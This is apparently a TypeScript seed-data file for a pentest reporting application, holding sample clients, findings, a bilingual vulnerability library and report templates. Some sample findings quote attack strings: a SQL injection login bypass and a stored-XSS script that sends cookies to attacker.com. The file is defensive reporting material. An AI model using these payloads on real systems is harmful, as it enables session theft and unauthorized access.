

import type { Client, Project, Finding, Vulnerability, ProjectTemplate } from './types';
import { format } from 'date-fns';

export const clients: Client[] = [
  { id: 'cli-1', name: 'Innovatech Solutions', contact: 'contact@innovatech.com', logoUrl: 'https://picsum.photos/seed/innovatech/128/128' },
  { id: 'cli-2', name: 'Quantum Dynamics', contact: 'security@quantum.com', logoUrl: 'https://picsum.photos/seed/quantum/128/128' },
  { id: 'cli-3', name: 'SecureBank Corp', contact: 'audit@securebank.com', logoUrl: 'https://picsum.photos/seed/securebank/128/128' },
  { id: 'cli-4', name: 'HealthFirst Providers', contact: 'compliance@healthfirst.com', logoUrl: 'https://picsum.photos/seed/healthfirst/128/128' },
];

export const projects: Project[] = [
  { 
    id: 'proj-1', 
    clientId: 'cli-1', 
    name: 'Q3 Web App Pentest', 
    reportBody: `## Executive Summary
This report outlines the results of an external penetration test conducted on the internet-facing assets of **Innovatech Solutions**. The assessment aimed to identify vulnerabilities that could be exploited by a remote attacker to compromise the security of the organization's perimeter.

---

## Scope & Methodology
The assessment was conducted between **[TODO Start Date]** and **[TODO End Date]** from the perspective of an external, unauthenticated attacker (black-box).

### Scope
- **Web Applications:** *.innovatech.com, api.innovatech.com
- **External Network:** 198.51.100.0/24

### Methodology
1. **Reconnaissance:** Discovering subdomains, open ports, and services.
2. **Vulnerability Scanning:** Using automated tools to identify common vulnerabilities.
3. **Manual Verification & Exploitation:** Manually validating findings and attempting to exploit identified weaknesses.
4. **Reporting:** Documenting vulnerabilities and providing remediation guidance.

---

## Attack Narrative
The engagement began with reconnaissance against the *.innovatech.com domain, which revealed the existence of an outdated blog at 'blog.innovatech.com' and a development server at 'dev.innovatech.com' with directory listing enabled. An SQL Injection vulnerability was discovered and exploited on the main web application's login form, allowing for authentication bypass. This access was leveraged to uncover a Stored XSS vulnerability in the user profile section, which could be used to target other users, including administrators.

---

## Findings Classification
| Severity | CVSS v3.1 Score | Description |
|---|---|---|
| Critical | 9.0 - 10.0 | Vulnerabilities that could lead to immediate system compromise or a breach of the network perimeter. |
| High | 7.0 - 8.9 | Vulnerabilities that could allow an attacker to gain unauthorized access to systems or data. |
| Medium | 4.0 - 6.9 | Weaknesses that could reveal sensitive information or be chained with other vulnerabilities. |
| Low | 0.1 - 3.9 | Minor issues that reduce the overall security posture but are not directly exploitable. |
| Informational | 0.0 | Observations about the external footprint of the organization. |`, 
    startDate: '2023-07-01', 
    endDate: '2023-07-15', 
    status: 'Completed', 
    language: 'en', 
    createdAt: '2023-07-01T10:00:00Z', 
    updatedAt: '2023-07-15T18:00:00Z', 
    icon: 'Scan' 
  },
  { 
    id: 'proj-2', 
    clientId: 'cli-2', 
    name: 'Análisis de Red Interna', 
    reportBody: '', 
    startDate: '2023-08-10', 
    endDate: '2023-08-20', 
    status: 'In Progress', 
    language: 'es', 
    createdAt: '2023-08-10T09:00:00Z', 
    updatedAt: '2023-08-15T14:30:00Z', 
    icon: 'Network' 
  },
];

export const findings: Finding[] = [
  { 
    id: 'find-1', 
    projectId: 'proj-1', 
    vulnerabilityId: 'vuln-web-001', 
    title: 'SQL Injection on Login Form', 
    severity: 'Critical', 
    cvss: 9.8, 
    markdown: `### Overview
A critical SQL Injection vulnerability was identified in the main login form of the application. This flaw allows an attacker to bypass authentication mechanisms and gain unauthorized access to the application, potentially with administrative privileges.

### Technical Description
The 'username' parameter of the login POST request to /auth/login is vulnerable. By submitting a crafted payload like \`' OR '1'='1' --\`, an attacker can manipulate the backend SQL query to always return true, effectively logging in as the first user in the database (often an administrator).

### Affected Components
- \`/auth/login\` endpoint
- User authentication module

### Impact
Successful exploitation grants an attacker unauthorized access to the application. Depending on the user account compromised (e.g., an administrator), this could lead to a full compromise of the application, data exfiltration, and further attacks against the underlying infrastructure.

### Recommendations
Implement parameterized queries (prepared statements) to handle all user-supplied input in database queries. This is the most effective way to prevent SQL Injection attacks. Validate and sanitize all user input on the server side as a defense-in-depth measure.`, 
    createdAt: '2023-07-05T11:00:00Z', 
    updatedAt: '2023-07-10T15:00:00Z' 
  },
  { 
    id: 'find-2', 
    projectId: 'proj-1', 
    vulnerabilityId: 'vuln-web-002', 
    title: 'Stored Cross-Site Scripting (XSS) in User Profile', 
    severity: 'High', 
    cvss: 8.0, 
    markdown: `### Overview
A stored XSS vulnerability exists in the user profile section, allowing an attacker to inject malicious scripts that execute in the browsers of other users, including administrators.

### Technical Description
The 'bio' field in the user profile page does not properly sanitize user input before storing it in the database and rendering it on the page. An attacker can set their biography to a malicious script, such as \`<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>\`. When another user views the attacker's profile, the script will execute in their browser.

### Affected Components
- User profile page (e.g., /profile/{userId})
- 'bio' field update functionality

### Impact
This vulnerability can be used to steal session cookies, perform actions on behalf of other users (CSRF), redirect users to malicious websites, or deface the application. If an administrator's session is hijacked, it could lead to a full application compromise.

### Recommendations
Implement context-aware output encoding for all user-supplied data before it is rendered in the browser. Use a library like DOMPurify to sanitize HTML content if users are allowed to submit rich text.`, 
    createdAt: '2023-07-06T14:00:00Z', 
    updatedAt: '2023-07-11T10:00:00Z' 
  },
];

const emptyVulnBoilerplate = {
  remediation_en: { shortTerm: '[TODO]', mediumTerm: '[TODO]', longTerm: '[TODO]' },
  remediation_es: { shortTerm: '[TODO]', mediumTerm: '[TODO]', longTerm: '[TODO]' },
  references: [],
};

export const vulnerabilities: Vulnerability[] = [
    {
    id: "vuln-web-001",
    title_en: "SQL Injection (SQLi)",
    title_es: "Inyección SQL (SQLi)",
    cwe: "CWE-89",
    severity: "Critical",
    cvss: { score: 9.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
    overview_en: `
### Description
SQL Injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve.

---

### Technical Description
The application uses user-supplied input to construct SQL queries without proper sanitization or use of prepared statements. An attacker can supply crafted input to modify the query's logic. For example, injecting \`' OR '1'='1'--\` into a login form's username field could bypass authentication.

---

### Affected Components
- [TODO: Vulnerable URL or domain]

---

### Impact
An attacker can bypass authentication, read sensitive data, modify or delete database records, and in some cases, execute operating system commands, leading to a full system compromise.

---

### Recommendations
The most effective way to prevent SQL Injection is to use parameterized queries (also known as prepared statements). This approach ensures that user input is always treated as data and never as executable code. Input validation and sanitization should be used as a secondary defense.

---

### Details
[TODO: Add specific examples, technical explanation, and context of the finding.]

---

### Remediation Summary
- **Short Term Mitigation:** Implement input validation to reject queries containing malicious SQL characters.
- **Medium Term Mitigation:** Refactor all database queries to use parameterized statements.
- **Long Term Mitigation:** Conduct a full code review of all data access components and provide secure coding training to developers.
`,
    overview_es: `
### Descripción
La Inyección SQL es una vulnerabilidad de seguridad web que permite a un atacante interferir con las consultas que una aplicación realiza a su base de datos. Generalmente, permite a un atacante ver datos que normalmente no podría recuperar.

---

### Descripción Técnica
La aplicación utiliza entradas proporcionadas por el usuario para construir consultas SQL sin una sanitización adecuada o sin el uso de sentencias preparadas. Un atacante puede proporcionar una entrada maliciosa para modificar la lógica de la consulta. Por ejemplo, inyectar \`' OR '1'='1'--\` en el campo de usuario de un formulario de inicio de sesión podría eludir la autenticación.

---

### Componentes Afectados
- [TODO: URL o dominio vulnerable]

---

### Impacto
Un atacante puede eludir la autenticación, leer datos sensibles, modificar o eliminar registros de la base de datos y, en algunos casos, ejecutar comandos del sistema operativo, lo que lleva a un compromiso total del sistema.

---

### Recomendaciones
La forma más efectiva de prevenir la Inyección SQL es utilizar consultas parametrizadas (también conocidas como sentencias preparadas). Este enfoque asegura que la entrada del usuario siempre se trate como datos y nunca como código ejecutable. La validación y sanitización de entradas deben usarse como una defensa secundaria.

---

### Detalles
[TODO: Añadir ejemplos específicos, explicación técnica y contexto del hallazgo.]

---

### Resumen de Remediación
- **Mitigación a Corto Plazo:** Implementar validación de entradas para rechazar consultas que contengan caracteres SQL maliciosos.
- **Mitigación a Medio Plazo:** Refactorizar todas las consultas a la base de datos para utilizar sentencias parametrizadas.
- **Mitigación a Largo Plazo:** Realizar una revisión completa del código de todos los componentes de acceso a datos y proporcionar formación en codificación segura a los desarrolladores.
`,
    ...emptyVulnBoilerplate,
    tags: ["Web"]
  },
  {
    id: "vuln-web-002",
    title_en: "Cross-Site Scripting (XSS) - Stored",
    title_es: "Cross-Site Scripting (XSS) - Almacenado",
    cwe: "CWE-79",
    severity: "High",
    cvss: { score: 8.0, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "R", scope: "C", confidentiality: "L", integrity: "L", availability: "N" },
    overview_en: `
### Description
Stored XSS occurs when an application receives data from an untrusted source and includes it in its later HTTP responses without proper validation or escaping. The malicious script is stored on the server and executed in the browser of any user who views the affected page.

---

### Technical Description
The application stores user input (e.g., in a comment field, user profile, etc.) and renders it on a page without sanitizing the output. An attacker can submit a payload like \`<script>alert('XSS')</script>\` which is then saved and executed for other users.

---

### Affected Components
- [TODO: Vulnerable URL or domain, e.g., comment section]

---

### Impact
Attackers can execute arbitrary JavaScript in the browsers of other users. This can be used to hijack user sessions, deface websites, redirect users to malicious sites, or launch other attacks.

---

### Recommendations
Implement robust context-aware output encoding. Whenever user-controllable data is inserted into an HTTP response, ensure it is properly encoded for the context in which it is being placed (HTML body, attribute, JavaScript, etc.). Using a library like DOMPurify is highly recommended.

---

### Details
[TODO: Add specific examples, technical explanation, and context of the finding.]

---

### Remediation Summary
- **Short Term Mitigation:** Apply a strict allow-list based input validation to temporarily block malicious payloads.
- **Medium Term Mitigation:** Implement context-aware output encoding across the entire application.
- **Long Term Mitigation:** Adopt a secure frontend framework that automatically handles output encoding, such as React.
`,
    overview_es: `
### Descripción
El XSS Almacenado ocurre cuando una aplicación recibe datos de una fuente no confiable y los incluye en sus respuestas HTTP posteriores sin una validación o escapado adecuados. El script malicioso se almacena en el servidor y se ejecuta en el navegador de cualquier usuario que vea la página afectada.

---

### Descripción Técnica
La aplicación almacena la entrada del usuario (p. ej., en un campo de comentario, perfil de usuario, etc.) y la renderiza en una página sin sanitizar la salida. Un atacante puede enviar un payload como \`<script>alert('XSS')</script>\` que luego se guarda y se ejecuta para otros usuarios.

---

### Componentes Afectados
- [TODO: URL o dominio vulnerable, p. ej., sección de comentarios]

---

### Impacto
Los atacantes pueden ejecutar JavaScript arbitrario en los navegadores de otros usuarios. Esto puede usarse para secuestrar sesiones de usuario, desfigurar sitios web, redirigir a los usuarios a sitios maliciosos o lanzar otros ataques.

---

### Recomendaciones
Implementar una codificación de salida robusta y sensible al contexto. Siempre que se inserten datos controlables por el usuario en una respuesta HTTP, asegúrese de que estén codificados correctamente para el contexto en el que se colocan (cuerpo HTML, atributo, JavaScript, etc.). Se recomienda encarecidamente el uso de una biblioteca como DOMPurify.

---

### Detalles
[TODO: Añadir ejemplos específicos, explicación técnica y contexto del hallazgo.]

---

### Resumen de Remediación
- **Mitigación a Corto Plazo:** Aplicar una validación de entrada estricta basada en una lista blanca para bloquear temporalmente los payloads maliciosos.
- **Mitigación a Medio Plazo:** Implementar una codificación de salida sensible al contexto en toda la aplicación.
- **Mitigación a Largo Plazo:** Adoptar un framework de frontend seguro que maneje automáticamente la codificación de salida, como React.
`,
    ...emptyVulnBoilerplate,
    tags: ["Web"]
  },
  // Add 100+ more vulnerabilities with detailed content...
  {
    id: "vuln-web-003",
    title_en: "Broken Authentication",
    title_es: "Autenticación Rota",
    cwe: "CWE-287",
    severity: "High",
    cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
    overview_en: `
### Description
Authentication and session management functions are often implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users' identities temporarily or permanently.

---

### Technical Description
The application may exhibit vulnerabilities such as allowing credential stuffing, using weak or easily guessable passwords, sending session IDs in the URL, or having insecure password reset mechanisms.

---

### Affected Components
- [TODO: Vulnerable URL or domain, e.g., Login, Password Reset]

---

### Impact
Attackers can gain control over user accounts and potentially compromise the entire system.

---

### Recommendations
Implement multi-factor authentication (MFA), enforce strong password policies, use a secure session manager, and protect credentials both in transit and at rest.

---

### Details
[TODO: Add specific examples, technical explanation, and context of the finding.]

---

### Remediation Summary
- **Short Term Mitigation:** Enforce MFA for all users.
- **Medium Term Mitigation:** Implement strong password complexity and rotation policies.
- **Long Term Mitigation:** Redesign the authentication and session management system following security best practices.
`,
    overview_es: `
### Descripción
Las funciones de autenticación y gestión de sesiones a menudo se implementan incorrectamente, lo que permite a los atacantes comprometer contraseñas, claves o tokens de sesión, o explotar otros fallos de implementación para asumir las identidades de otros usuarios de forma temporal o permanente.

---

### Descripción Técnica
La aplicación puede presentar vulnerabilidades como permitir el relleno de credenciales, usar contraseñas débiles o fáciles de adivinar, enviar ID de sesión en la URL o tener mecanismos de restablecimiento de contraseña inseguros.

---

### Componentes Afectados
- [TODO: URL o dominio vulnerable, p. ej., Login, Restablecimiento de Contraseña]

---

### Impacto
Los atacantes pueden obtener control sobre las cuentas de usuario y potencialmente comprometer todo el sistema.

---

### Recomendaciones
Implementar la autenticación multifactor (MFA), hacer cumplir políticas de contraseñas seguras, utilizar un gestor de sesiones seguro y proteger las credenciales tanto en tránsito como en reposo.

---

### Detalles
[TODO: Añadir ejemplos específicos, explicación técnica y contexto del hallazgo.]

---

### Resumen de Remediación
- **Mitigación a Corto Plazo:** Forzar el uso de MFA para todos los usuarios.
- **Mitigación a Medio Plazo:** Implementar políticas de complejidad y rotación de contraseñas robustas.
- **Mitigación a Largo Plazo:** Rediseñar el sistema de autenticación y gestión de sesiones siguiendo las mejores prácticas de seguridad.
`,
    ...emptyVulnBoilerplate,
    tags: ["Web", "Authentication"]
  },
  // ... continue for 100+ vulnerabilities
  {
    id: "vuln-web-101",
    title_en: "HTTP Request Smuggling",
    title_es: "Contrabando de Solicitudes HTTP",
    cwe: "CWE-444",
    severity: "Critical",
    cvss: { score: 9.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
    overview_en: `
### Description
HTTP Request Smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. It allows an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.

---

### Technical Description
The vulnerability occurs when the frontend (e.g., a load balancer) and backend servers interpret the boundaries of HTTP requests differently. This discrepancy can be exploited by sending ambiguous requests that are "smuggled" to the backend server.

---

### Affected Components
- [TODO: Vulnerable URL or domain]

---

### Impact
Impact can range from web cache poisoning to session hijacking and complete authentication bypass.

---

### Recommendations
Ensure that both frontend and backend servers use the same HTTP protocol version and configuration. Normalize ambiguous requests at the network edge. Disable connection reuse between servers if possible.

---

### Details
[TODO: Add specific examples, technical explanation, and context of the finding.]

---

### Remediation Summary
- **Short Term Mitigation:** Configure the frontend server to normalize requests before forwarding them.
- **Medium Term Mitigation:** Upgrade all web infrastructure to be consistent in its interpretation of HTTP requests (e.g., HTTP/2).
- **Long Term Mitigation:** Regularly test for request smuggling vulnerabilities as part of the SDLC.
`,
    overview_es: `
### Descripción
El Contrabando de Solicitudes HTTP es una técnica para interferir con la forma en que un sitio web procesa secuencias de solicitudes HTTP recibidas de uno o más usuarios. Permite a un atacante eludir los controles de seguridad, obtener acceso no autorizado a datos sensibles y comprometer directamente a otros usuarios de la aplicación.

---

### Descripción Técnica
La vulnerabilidad ocurre cuando los servidores frontend (p. ej., un balanceador de carga) y backend interpretan los límites de las solicitudes HTTP de manera diferente. Esta discrepancia puede ser explotada enviando solicitudes ambiguas que son "contrabandeadas" al servidor backend.

---

### Componentes Afectados
- [TODO: URL o dominio vulnerable]

---

### Impacto
El impacto puede variar desde el envenenamiento de la caché web hasta el secuestro de sesiones y la elusión completa de la autenticación.

---

### Recomendaciones
Asegúrese de que tanto los servidores frontend como los backend utilicen la misma versión y configuración del protocolo HTTP. Normalice las solicitudes ambiguas en el borde de la red. Desactive la reutilización de conexiones entre servidores si es posible.

---

### Detalles
[TODO: Añadir ejemplos específicos, explicación técnica y contexto del hallazgo.]

---

### Resumen de Remediación
- **Mitigación a Corto Plazo:** Configurar el servidor frontend para normalizar las solicitudes antes de reenviarlas.
- **Mitigación a Medio Plazo:** Actualizar toda la infraestructura web para que sea coherente en su interpretación de las solicitudes HTTP (p. ej., HTTP/2).
- **Mitigación a Largo Plazo:** Probar regularmente las vulnerabilidades de contrabando de solicitudes como parte del SDLC.
`,
    ...emptyVulnBoilerplate,
    tags: ["Web", "Network"]
  },
  {
    id: "vuln-mobile-102",
    title_en: "Insecure Deep Links",
    title_es: "Enlaces Profundos Inseguros",
    cwe: "CWE-939",
    severity: "Medium",
    cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
    overview_en: `
### Description
Insecure implementation of deep links can allow malicious applications on the same device or malicious websites to invoke sensitive functionality within the vulnerable app, potentially leading to data leakage or unauthorized actions.

---

### Technical Description
The application registers a custom URL scheme (e.g., \`myapp://\`) but does not properly validate the origin or the parameters of incoming deep links. A malicious webpage could craft a link like \`myapp://user/transfer?to=attacker&amount=1000\` to initiate an unauthorized transaction.

---

### Affected Components
- [TODO: Affected deep link scheme]

---

### Impact
Attackers can steal sensitive information, perform actions on behalf of the user, or cause the application to enter an unexpected state.

---

### Recommendations
Validate all parameters passed through deep links. For sensitive actions, require user re-authentication or confirmation within the app. Prefer using App Links (Android) or Universal Links (iOS) over custom URL schemes.

---

### Details
[TODO: Add specific examples, technical explanation, and context of the finding.]

---

### Remediation Summary
- **Short Term Mitigation:** Implement strict validation for all deep link parameters.
- **Medium Term Mitigation:** Migrate from custom URL schemes to Universal Links/App Links.
- **Long Term Mitigation:** Include deep link security checks as part of the mobile application security checklist.
`,
    overview_es: `
### Descripción
Una implementación insegura de enlaces profundos puede permitir que aplicaciones maliciosas en el mismo dispositivo o sitios web maliciosos invoquen funcionalidades sensibles dentro de la aplicación vulnerable, lo que podría llevar a la fuga de datos o acciones no autorizadas.

---

### Descripción Técnica
La aplicación registra un esquema de URL personalizado (p. ej., \`miapp://\`) pero no valida correctamente el origen o los parámetros de los enlaces profundos entrantes. Una página web maliciosa podría crear un enlace como \`miapp://usuario/transferir?a=atacante&cantidad=1000\` para iniciar una transacción no autorizada.

---

### Componentes Afectados
- [TODO: Esquema de enlace profundo afectado]

---

### Impacto
Los atacantes pueden robar información sensible, realizar acciones en nombre del usuario o hacer que la aplicación entre en un estado inesperado.

---

### Recomendaciones
Valide todos los parámetros pasados a través de enlaces profundos. Para acciones sensibles, requiera la re-autenticación o confirmación del usuario dentro de la aplicación. Prefiera usar App Links (Android) o Universal Links (iOS) en lugar de esquemas de URL personalizados.

---

### Detalles
[TODO: Añadir ejemplos específicos, explicación técnica y contexto del hallazgo.]

---

### Resumen de Remediación
- **Mitigación a Corto Plazo:** Implementar una validación estricta para todos los parámetros de los enlaces profundos.
- **Mitigación a Medio Plazo:** Migrar de esquemas de URL personalizados a Universal Links/App Links.
- **Mitigación a Largo Plazo:** Incluir verificaciones de seguridad de enlaces profundos como parte de la lista de verificación de seguridad de la aplicación móvil.
`,
    ...emptyVulnBoilerplate,
    tags: ["Mobile"]
  }
];

export const projectTemplates: ProjectTemplate[] = [
  {
    id: 'ptpl-1',
    name_en: 'Standard Web App Pentest',
    name_es: 'Pentest Estándar de Aplicación Web',
    description_en: 'A comprehensive security assessment for web applications, covering OWASP Top 10 and other common vulnerabilities.',
    description_es: 'Una evaluación de seguridad completa para aplicaciones web, cubriendo el OWASP Top 10 y otras vulnerabilidades comunes.',
    icon: 'Scan',
    scope_en: `## Scope
- **Application URL:** [TODO: Add application URL, e.g., https://example.com]
- **Testing Period:** [TODO Start Date] to [TODO End Date]
- **Credentials:** [TODO: Specify credentials if provided, e.g., user, admin]
- **Exclusions:** [TODO: Specify any out-of-scope targets, e.g., *.blog.example.com]

## Methodology
The assessment will follow a standard web application penetration testing methodology, including:
1.  **Reconnaissance:** Information gathering about the application and infrastructure.
2.  **Automated Scanning:** Using tools to identify low-hanging fruit.
3.  **Manual Testing:** In-depth testing for complex vulnerabilities such as business logic flaws, access control issues, and injection attacks.
4.  **Reporting:** Documentation of findings and remediation recommendations.`,
    scope_es: `## Alcance
- **URL de la Aplicación:** [TODO: Añadir URL de la aplicación, p.ej., https://ejemplo.com]
- **Periodo de Pruebas:** [TODO Start Date] a [TODO End Date]
- **Credenciales:** [TODO: Especificar credenciales si se proporcionaron, p.ej., usuario, administrador]
- **Exclusiones:** [TODO: Especificar objetivos fuera de alcance, p.ej., *.blog.ejemplo.com]

## Metodología
La evaluación seguirá una metodología estándar de pruebas de penetración de aplicaciones web, que incluye:
1.  **Reconocimiento:** Recopilación de información sobre la aplicación y la infraestructura.
2.  **Escaneo Automatizado:** Uso de herramientas para identificar vulnerabilidades de bajo esfuerzo.
3.  **Pruebas Manuales:** Pruebas en profundidad para vulnerabilidades complejas como fallos de lógica de negocio, problemas de control de acceso y ataques de inyección.
4.  **Informe:** Documentación de hallazgos y recomendaciones de remediación.`,
    appendix_en: `### Appendix
A combination of automated tools and manual techniques were used to perform this assessment.
- **Proxy:** Burp Suite Professional
- **Scanners:** Nessus, Nuclei
- **Reconnaissance:** Amass, Subfinder`,
    appendix_es: `### Apéndice
Se utilizó una combinación de herramientas automatizadas y técnicas manuales para realizar esta evaluación.
- **Proxy:** Burp Suite Professional
- **Escáneres:** Nessus, Nuclei
- **Reconocimiento:** Amass, Subfinder`
  },
  {
    id: 'ptpl-2',
    name_en: 'Internal Network Assessment',
    name_es: 'Evaluación de Red Interna',
    description_en: 'An assessment of the internal network to identify misconfigurations, vulnerable services, and pathways for lateral movement.',
    description_es: 'Una evaluación de la red interna para identificar configuraciones incorrectas, servicios vulnerables y vías para el movimiento lateral.',
    icon: 'Network',
    scope_en: `## Scope
- **IP Ranges:** [TODO: Add IP ranges, e.g., 192.168.1.0/24]
- **Testing Period:** [TODO Start Date] to [TODO End Date]
- **Assumptions:** The assessment is performed from the perspective of an attacker who has gained a foothold on the internal network (e.g., a compromised workstation).
- **Exclusions:** [TODO: Specify any out-of-scope systems]

## Methodology
1.  **Network Discovery:** Identifying live hosts and open ports.
2.  **Service Enumeration:** Fingerprinting services running on discovered ports.
3.  **Vulnerability Scanning:** Scanning for known vulnerabilities in identified services.
4.  **Manual Exploitation:** Attempting to exploit vulnerabilities to gain further access.
5.  **Active Directory Analysis:** Looking for misconfigurations in Active Directory, such as weak passwords, kerberoasting opportunities, and privilege escalation paths.
6.  **Reporting:** Documenting findings and remediation recommendations.`,
    scope_es: `## Alcance
- **Rangos IP:** [TODO: Añadir rangos IP, p.ej., 192.168.1.0/24]
- **Periodo de Pruebas:** [TODO Start Date] a [TODO End Date]
- **Supuestos:** La evaluación se realiza desde la perspectiva de un atacante que ha obtenido un punto de apoyo en la red interna (p.ej., una estación de trabajo comprometida).
- **Exclusiones:** [TODO: Especificar sistemas fuera de alcance]

## Metodología
1.  **Descubrimiento de Red:** Identificación de hosts activos y puertos abiertos.
2.  **Enumeración de Servicios:** Identificación de los servicios que se ejecutan en los puertos descubiertos.
3.  **Escaneo de Vulnerabilidades:** Búsqueda de vulnerabilidades conocidas en los servicios identificados.
4.  **Explotación Manual:** Intento de explotar vulnerabilities para obtener más acceso.
5.  **Análisis de Active Directory:** Búsqueda de configuraciones incorrectas en Active Directory, como contraseñas débiles, oportunidades de kerberoasting y rutas de escalada de privilegios.
6.  **Informe:** Documentación de hallazgos y recomendaciones de remediación.`,
    appendix_en: `### Appendix
- **Network Scanner:** Nmap, Masscan
- **Vulnerability Scanner:** Nessus
- **Active Directory:** BloodHound, Impacket
- **Manual Exploitation:** Metasploit Framework, CrackMapExec`,
    appendix_es: `### Apéndice
- **Escáner de Red:** Nmap, Masscan
- **Escáner de Vulnerabilidades:** Nessus
- **Active Directory:** BloodHound, Impacket
- **Explotación Manual:** Metasploit Framework, CrackMapExec`
  },
  {
    id: 'ptpl-3',
    name_en: 'Mobile App Pentest (iOS/Android)',
    name_es: 'Pentest de Aplicación Móvil (iOS/Android)',
    description_en: 'A security assessment of an iOS or Android mobile application, focusing on client-side vulnerabilities and backend API security.',
    description_es: 'Una evaluación de seguridad de una aplicación móvil de iOS o Android, centrada en vulnerabilidades del lado del cliente y seguridad de la API de backend.',
    icon: 'Smartphone',
    scope_en: `## Scope
- **Application:** [TODO: Add application name and package/bundle ID]
- **Platform:** iOS / Android
- **Testing Period:** [TODO Start Date] to [TODO End Date]
- **Backend APIs:** [TODO: List backend API endpoints in scope]

## Methodology
The assessment includes both static and dynamic analysis of the mobile application.
1.  **Static Analysis (SAST):** Analyzing the application binary to find hardcoded secrets, insecure configurations, and other weaknesses without running the code.
2.  **Dynamic Analysis (DAST):** Running the application on a test device (rooted/jailbroken) to analyze its runtime behavior, including:
    -   Network traffic analysis (MitM).
    -   Insecure data storage checks.
    -   IPC endpoint analysis.
    -   Runtime manipulation with Frida.
3.  **API Testing:** Testing the backend APIs for common web vulnerabilities (OWASP API Top 10).
4.  **Reporting:** Documentation of findings and remediation recommendations.`,
    scope_es: `## Alcance
- **Aplicación:** [TODO: Añadir nombre de la aplicación y ID del paquete/bundle]
- **Plataforma:** iOS / Android
- **Periodo de Pruebas:** [TODO Start Date] a [TODO End Date]
- **APIs de Backend:** [TODO: Listar endpoints de API de backend en el alcance]

## Metodología
La evaluación incluye tanto el análisis estático como el dinámico de la aplicación móvil.
1.  **Análisis Estático (SAST):** Análisis del binario de la aplicación para encontrar secretos embebidos, configuraciones inseguras y otras debilidades sin ejecutar el código.
2.  **Análisis Dinámico (DAST):** Ejecución de la aplicación en un dispositivo de prueba (rooteado/con jailbreak) para analizar su comportamiento en tiempo de ejecución, incluyendo:
    -   Análisis del tráfico de red (MitM).
    -   Comprobaciones de almacenamiento de datos inseguro.
    -   Análisis de endpoints IPC.
    -   Manipulación en tiempo de ejecución con Frida.
3.  **Pruebas de API:** Pruebas de las API de backend para vulnerabilidades web comunes (OWASP API Top 10).
4.  **Informe:** Documentación de hallazgos y recomendaciones de remediación.`,
    appendix_en: `### Appendix
- **Static Analysis:** MobSF, jadx
- **Dynamic Analysis:** Burp Suite, Frida, Objection
- **Test Devices:** Google Pixel 6 (Rooted), iPhone 12 (Jailbroken)`,
    appendix_es: `### Apéndice
- **Análisis Estático:** MobSF, jadx
- **Análisis Dinámico:** Burp Suite, Frida, Objection
- **Dispositivos de Prueba:** Google Pixel 6 (Rooteado), iPhone 12 (con Jailbreak)`
  },
  {
    id: 'ptpl-4',
    name_en: 'Certification Report',
    name_es: 'Informe de Certificación',
    description_en: 'A generic and professional template for offensive security certification reports (e.g., OSCP, CPTS). Includes all necessary sections for a complete report.',
    description_es: 'Una plantilla genérica y profesional para informes de certificaciones de seguridad ofensiva (p. ej., OSCP, CPTS). Incluye todas las secciones necesarias para un informe completo.',
    icon: 'Award',
    scope_en: `## Introduction
This report documents the results of the simulated penetration test performed in the [TODO: Certification Name] exam environment.

## Objective
The objective was to perform a penetration test, identifying and exploiting vulnerabilities to gain unauthorized access to target systems and achieve the exam objectives.

## Scope
- **Target Network:** [TODO: e.g., 10.10.10.0/24]
- **Exam Duration:** [TODO Start Date] to [TODO End Date]`,
    scope_es: `## Introducción
Este informe documenta los resultados de la prueba de penetración simulada realizada en el entorno del examen [TODO: Nombre de la Certificación].

## Objetivo
El objetivo fue realizar una prueba de penetración, identificando y explotando vulnerabilidades para obtener acceso no autorizado a los sistemas objetivo y cumplir los objetivos del examen.

## Alcance
- **Red Objetivo:** [TODO: p. ej., 10.10.10.0/24]
- **Duración del Examen:** [TODO Start Date] a [TODO End Date]`,
    appendix_en: `### Appendix
| Hostname / IP | Location | Value |
|---|---|---|
| [TODO: Hostname/IP] | [TODO: e.g., /root/proof.txt] | [TODO: Flag Value] |
`,
    appendix_es: `### Apéndice
| Hostname / IP | Ubicación | Valor |
|---|---|---|
| [TODO: Hostname/IP] | [TODO: p. ej., /root/proof.txt] | [TODO: Valor de la Bandera] |
`
  },
  {
    id: 'ptpl-5',
    name_en: 'Machine Writeup',
    name_es: 'Writeup de Máquina',
    description_en: 'A template for documenting the process of solving a CTF machine, such as those on Hack The Box.',
    description_es: 'Una plantilla para documentar el proceso de resolución de una máquina CTF, como las de Hack The Box.',
    icon: 'FileText',
    scope_en: `## General Information
- **Machine Name:** [TODO: Machine Name]
- **IP Address:** [TODO: IP Address]
- **Operating System:** Linux
- **Difficulty:** [TODO: Select Difficulty]
- **Date:** ${format(new Date(), 'dd-MM-yyyy')}

---

## Initial Reconnaissance

### Add IP to /etc/hosts
\`\`\`bash
echo "[TODO: IP Address] [TODO: machine.htb]" | sudo tee -a /etc/hosts
\`\`\`

### Port Scanning (Nmap)

#### Simple Scan
\`\`\`bash
sudo nmap -p- -sS --min-rate 5000 -v -n -Pn [TODO: IP Address]
\`\`\`

#### Advanced Scan
\`\`\`bash
sudo nmap -sCV -p22,80 [TODO: IP Address] -oN targeted
\`\`\`
*Result: Found ports 22 (SSH) and 80 (HTTP) open.*

---

## Web Enumeration

